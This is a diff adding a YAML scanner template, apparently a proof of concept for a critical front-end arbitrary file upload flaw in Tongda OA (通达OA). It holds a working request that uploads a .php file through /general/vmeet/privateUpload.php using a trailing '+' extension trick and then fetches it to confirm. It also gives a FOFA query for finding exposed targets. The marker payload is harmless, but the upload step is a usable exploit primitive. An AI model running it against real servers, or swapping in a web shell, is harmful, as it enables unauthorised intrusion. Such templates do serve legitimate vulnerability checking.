@@ -1,0 +1,31 @@
+id: poc-yaml-tongda-oa-privateupload-anyfile-upload
+info:
+  name: 通达OA privateUpload 前台任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 通达OA
+  fofa: app="TDXK-通达OA" && icon_hash="-99198135"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /general/vmeet/privateUpload.php?fileName={{.t1}}.php+
+  headers:
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+  data: '--00content0boundary00
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.png"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    --00content0boundary00--'
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /general/vmeet/upload/temp/{{.t1}}.php
+  expression: status_code == 200 && contains(body,t2)
+transport: http
